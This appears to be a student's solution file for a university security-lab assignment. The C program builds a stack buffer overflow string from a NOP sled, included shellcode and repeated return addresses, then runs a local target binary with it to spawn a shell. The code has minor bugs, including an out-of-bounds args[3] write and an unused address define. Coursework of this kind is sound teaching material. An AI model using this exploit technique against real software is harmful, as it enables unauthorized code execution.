#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

/**********************************************************
 Instructions
 ------------
 
 1. Make sure you type in your student number in the #define below.  You should format your student number as a string without spaces like this:
 
 #define STUDENT_NUMBER "989990924"
 
 It does not matter whether your student number is 9 or 10 digits.  
 
 2. Fill in the "attackString" variable with your attack string.  Your goal will be to execute the shellcode, which is the same as in the lab and spawn a shell.
 
 3. To submit your solution please upload your sploit.c file and *nothing* else.  Your entire solution should fit in your sploit.c file.
 ***********************************************************/
 
 
 
#define STUDENT_NUMBER "1002263935"
#define TARGET "target"
#define BUFSIZE 221  //2%8*8=2*8=16 + 112 = 128 216+5=221
#define TARGET_ADDR 0x42b9edd0 
#define SHELL_SIZE 45
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
    char *args[3];
    char *env[1];
    char *attackString, *ptr;
    int target_addr = 0x4a5f8dc0;	
    int i;
    int numNOPs = 91;

    if(!(attackString = malloc(BUFSIZE))){
	printf("Cant allocate memory \n");
	exit(0);
    }
    int *attackStringAsInt = (int *) attackString;
    for(i = 0;  i < BUFSIZE / sizeof(int); i++)
	*(attackStringAsInt++) = target_addr;
    attackString[220] = 0;

    for(i = 0; i < numNOPs; i++)
	attackString[i] = NOP;
    ptr = attackString + numNOPs;
    for(i=0; i< strlen(shellcode); i++)
	*(ptr++) = shellcode[i];	
   
    //char target_addr[] = "\xd0\xed\xb9\x42";

    //for(i=0; i 
       
    /* Call the target with our attack string. */
    args[0] = TARGET; 
    args[1] = STUDENT_NUMBER; 
    args[2] = attackString; 
    args[3] = NULL;
    env[0] = NULL;
    
    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");
    
    return 0;
}
